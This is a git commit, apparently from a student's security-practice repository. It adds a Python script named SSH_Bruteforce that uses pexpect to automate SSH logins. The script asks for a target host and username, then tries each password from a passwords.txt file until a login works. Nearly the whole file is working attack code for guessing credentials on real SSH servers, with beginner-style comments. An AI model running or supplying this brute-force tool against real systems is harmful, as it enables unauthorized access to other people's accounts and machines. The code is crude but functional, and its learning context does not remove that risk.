2a795f7856913032773b64170d20c21e63567c0d
Adam Beardsley <a.beardsley79@gmail.com>
2020-11-23 14:15:58 +0000

    SSH_FTP_Attacks: SSH_Bruteforce:
    using connect function from previous project(SSH_Auto_login0.1) to connect via ssh.
    Added to main() a for loop (lines 46-52) which searches through a .txt file and trys to remotley connect to a system
    trying each password in file

---
+++ SSH_FTP_Attacks/SSH_Bruteforce/__init__.py
@@ -0,0 +1,58 @@
+#!/usr/bin/python3
+
+import pexpect
+
+#list of input prompts that may be givne in terminal after login in to ssh
+PROMPT = ['# ', '>>> ', '> ', '\$ ']
+
+#Automating ssh conection
+def connect(user, host, password):
+    #ssh_newkey string respons that wil be genarated after ssh command is given in terminal
+    ssh_newkey = 'Are you sure you want to continue connecting'
+    
+    #connStr set = to sting to run ssh command in terminal
+    connStr = 'ssh ' + user +'@' + host
+    
+    #pexpect.spawn will automatically run what is passed in as parameter (connStr)
+    child = pexpect.spawn(connStr)
+    #child.expect response after running ssh call in terminal
+    #ssh respons give as a list
+    #ssh_newkey: is string above 
+    #'[P,p]assword: ': maybe ethier uper or lower case p in password 
+    #ret set = to respons which is 0(False) or 1(True)
+    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P,p]assword: '])
+    
+    #lodgic to deal with returend respons. now stored in ret
+    if ret == 0:
+        print("[-] Error connecting")
+        return
+    if ret == 1:
+        #sendline() sends response. (this is give as command in terminal)
+        child.sendline('yes')
+        ret = child.expect([pexpect.TIMEOUT, '[P,p]assword: '])
+        if ret == 0:
+            print('[-] Error Connecting')
+            return 
+    #more expected responses from ssh and then return child
+    child.sendline(password)
+    child.expect(PROMPT, timeout = 0.5)
+    return child
+
+def main():
+    host = input("Enter host ip to Bruteforce:")
+    user = input("Enter user to Bruteforce:")
+    file = open('passwords.txt', 'r')
+    
+    for password in file.readlines():
+        password =  password.strip('\n')
+        try:
+            child = connect(user, host, password)
+            print(f"[+] password found: {password}")
+        except:
+            print("[-] Password not found")
+    
+    
+main()
+        
+    
+
